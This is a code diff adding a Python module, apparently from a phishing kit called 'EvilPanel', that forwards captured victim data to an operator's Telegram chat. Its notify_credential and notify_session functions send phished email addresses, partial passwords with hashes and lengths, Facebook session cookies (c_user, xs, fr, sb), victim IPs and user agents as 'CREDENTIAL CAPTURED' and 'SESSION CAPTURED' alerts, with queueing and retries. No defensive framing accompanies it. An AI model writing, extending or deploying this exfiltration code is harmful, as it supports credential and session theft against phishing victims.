@@ -1,3 +1,246 @@
+import os
+import json
+import time
+import threading
+import queue
+import hashlib
+import requests
+
+try:
+    import yaml
+except Exception:
+    yaml = None
+
+from datetime import datetime
+
+# Default config path on VPS; fallback to repo-relative config/telegram.yaml
+DEFAULT_CFG = "/opt/evilpanel/config/telegram.yaml"
+FALLBACK_CFG = os.path.join(os.path.dirname(__file__), "..", "config", "telegram.yaml")
+FAILED_LOG = "/opt/evilpanel/logs/telegram_failed.jsonl"
+
+# Telegram limits: stay below 30 msg/sec; we use a conservative gap
+MIN_SEND_INTERVAL = 0.5
+
+
+def _escape_md(text: str) -> str:
+    if not text:
+        return ""
+    for ch in "\\`*_{}[]()#+-.!|>~=":
+        text = text.replace(ch, f"\\{ch}")
+    return text
+
+
+def _mask_email(email: str) -> str:
+    if "@" not in email or len(email) < 6:
+        return email
+    local, dom = email.split("@", 1)
+    if len(local) <= 3:
+        masked_local = local[0] + "***"
+    else:
+        masked_local = local[:3] + "***"
+    return f"{masked_local}@{dom}"
+
+
+def _mask_pw(pw: str) -> str:
+    if not pw:
+        return ""
+    if len(pw) <= 4:
+        return "***"
+    return pw[:2] + "***" + pw[-2:]
+
+
+def _mask_cookie(val: str, head=6, tail=4) -> str:
+    if not val:
+        return ""
+    if len(val) <= head + tail:
+        return val
+    return f"{val[:head]}…{val[-tail:]}"
+
+
+def _sha256_hex(s: str) -> str:
+    return hashlib.sha256(s.encode()).hexdigest() if s else ""
+
+
+def _load_config():
+    paths = [DEFAULT_CFG, FALLBACK_CFG]
+    cfg = {}
+    for p in paths:
+        if os.path.exists(p):
+            try:
+                if yaml:
+                    with open(p, "r") as f:
+                        cfg = yaml.safe_load(f) or {}
+                else:
+                    # naive parser
+                    with open(p, "r") as f:
+                        for line in f:
+                            if ":" in line:
+                                k, v = line.split(":", 1)
+                                cfg[k.strip()] = v.strip().strip('"').strip("'")
+            except Exception:
+                pass
+            break
+    # env overrides
+    cfg_env = {
+        "enabled": os.getenv("TELEGRAM_ENABLED"),
+        "bot_token": os.getenv("TELEGRAM_BOT_TOKEN"),
+        "chat_id": os.getenv("TELEGRAM_CHAT_ID"),
+        "timeout": os.getenv("TELEGRAM_TIMEOUT"),
+        "max_retries": os.getenv("TELEGRAM_MAX_RETRIES"),
+        "backoff_seconds": os.getenv("TELEGRAM_BACKOFF"),
+    }
+    for k, v in cfg_env.items():
+        if v is not None:
+            cfg[k] = v
+    # normalize
+    cfg.setdefault("enabled", False)
+    cfg["enabled"] = str(cfg["enabled"]).lower() in ["1", "true", "yes", "on"]
+    cfg["timeout"] = float(cfg.get("timeout", 10))
+    cfg["max_retries"] = int(cfg.get("max_retries", 5))
+    cfg["backoff_seconds"] = float(cfg.get("backoff_seconds", 2))
+    cfg["bot_token"] = cfg.get("bot_token", "")
+    cfg["chat_id"] = int(cfg.get("chat_id", 0)) if str(cfg.get("chat_id", "")).isdigit() else cfg.get("chat_id", 0)
+    return cfg
+
+
+class TelegramNotifier:
+    def __init__(self):
+        self.cfg = _load_config()
+        self.enabled = self.cfg.get("enabled", False) and self.cfg.get("bot_token") and self.cfg.get("chat_id")
+        self.queue = queue.Queue()
+        self.last_send = 0.0
+        self.worker = threading.Thread(target=self._worker_loop, daemon=True)
+        self.worker.start()
+
+    def _log_fail(self, event):
+        try:
+            with open(FAILED_LOG, "a") as f:
+                f.write(json.dumps(event) + "\n")
+        except Exception:
+            pass
+
+    def _send(self, text: str):
+        url = f"https://api.telegram.org/bot{self.cfg['bot_token']}/sendMessage"
+        payload = {
+            "chat_id": self.cfg["chat_id"],
+            "text": text,
+            "parse_mode": "MarkdownV2",
+        }
+        # rate limit
+        delta = time.time() - self.last_send
+        if delta < MIN_SEND_INTERVAL:
+            time.sleep(MIN_SEND_INTERVAL - delta)
+        resp = requests.post(url, json=payload, timeout=self.cfg["timeout"])
+        self.last_send = time.time()
+        if resp.status_code != 200:
+            raise RuntimeError(f"HTTP {resp.status_code} {resp.text}")
+
+    def _send_with_retries(self, event):
+        attempts = int(self.cfg["max_retries"])
+        backoff = float(self.cfg["backoff_seconds"])
+        for i in range(attempts):
+            try:
+                self._send(event["message"])
+                return True
+            except Exception:
+                time.sleep(backoff * (2 ** i))
+        return False
+
+    def _worker_loop(self):
+        while True:
+            event = self.queue.get()
+            if event is None:
+                break
+            ok = self._send_with_retries(event)
+            if not ok:
+                self._log_fail(event)
+            self.queue.task_done()
+
+    def stop(self):
+        try:
+            self.queue.put_nowait(None)
+        except Exception:
+            pass
+
+    def enqueue(self, event):
+        if not self.enabled:
+            return
+        try:
+            self.queue.put_nowait(event)
+        except Exception:
+            self._log_fail(event)
+
+    # Public helpers
+    def notify_credential(self, email, password, ip="", ua="", ts=None):
+        if not self.enabled:
+            return
+        ts = ts or datetime.utcnow().isoformat()
+        msg = self._format_credential(email, password, ip, ua, ts)
+        self.enqueue({"type": "credential", "message": msg, "ts": ts})
+
+    def notify_session(self, tokens, ip="", ua="", ts=None):
+        if not self.enabled:
+            return
+        ts = ts or datetime.utcnow().isoformat()
+        msg = self._format_session(tokens, ip, ua, ts)
+        self.enqueue({"type": "session", "message": msg, "ts": ts})
+
+    def _format_credential(self, email, password, ip, ua, ts):
+        masked_email = _escape_md(_mask_email(email))
+        pw_mask = _escape_md(_mask_pw(password))
+        pw_hash = _escape_md(_sha256_hex(password)[:16])
+        ua_s = _escape_md(ua[:80])
+        ip_s = _escape_md(ip)
+        ts_s = _escape_md(ts)
+        lines = [
+            "🚨 *CREDENTIAL CAPTURED*",
+            f"Email: `{masked_email}`",
+            f"Pass: `{pw_mask}` (sha256:{pw_hash}, len={len(password) if password else 0})",
+            f"IP/UA: `{ip_s}` / `{ua_s}`",
+            f"Captured: `{ts_s}`",
+            "Logs: `journalctl -u evilpanel -f`",
+        ]
+        return "\n".join(lines)
+
+    def _format_session(self, tokens, ip, ua, ts):
+        c_user = _escape_md(_mask_cookie(tokens.get("c_user", "")))
+        xs = _escape_md(_mask_cookie(tokens.get("xs", "")))
+        fr = _escape_md(_mask_cookie(tokens.get("fr", "")))
+        sb = _escape_md(_mask_cookie(tokens.get("sb", "")))
+        ua_s = _escape_md(ua[:80])
+        ip_s = _escape_md(ip)
+        ts_s = _escape_md(ts)
+        lines = [
+            "🚨 *SESSION CAPTURED*",
+            f"c_user: `{c_user}`",
+            f"xs: `{xs}`",
+            f"fr/sb: `{fr}` / `{sb}`",
+            f"IP/UA: `{ip_s}` / `{ua_s}`",
+            f"Captured: `{ts_s}`",
+            "Logs: `journalctl -u evilpanel -f`",
+        ]
+        return "\n".join(lines)
+
+
+notifier = TelegramNotifier()
+
+
+def cli_test(msg: str):
+    n = notifier
+    if not n.enabled:
+        print("Notifier disabled (enable in telegram.yaml or env).")
+        return
+    n.enqueue({"type": "test", "message": msg, "ts": datetime.utcnow().isoformat()})
+    time.sleep(1)
+
+
+if __name__ == "__main__":
+    import sys
+
+    if len(sys.argv) >= 3 and sys.argv[1] == "test":
+        cli_test(" ".join(sys.argv[2:]))
+    else:
+        print("Usage: python3 -m evilpanel.core.telegram_notifier test \"Sample message\"")
 """
 EvilPanel Telegram Notifier
 Real-time capture notifications via Telegram Bot API
